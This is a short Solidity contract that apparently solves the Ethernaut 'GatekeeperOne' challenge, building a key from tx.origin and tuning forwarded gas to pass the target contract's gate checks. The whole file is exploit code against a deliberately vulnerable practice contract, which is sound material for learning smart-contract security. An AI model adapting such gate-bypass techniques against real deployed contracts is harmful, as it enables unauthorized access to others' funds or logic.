// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAtt {
    function attack(address target, uint256 extra) public {
        uint32 low = uint16(tx.origin);
        uint64 key = uint64(1 << 32) + uint64(low);

        uint256 gas = gasleft();
        gas -= 8191 * 10 + extra;
        GatekeeperOne(target).enter.gas(gas)(bytes8(key));
    }
}
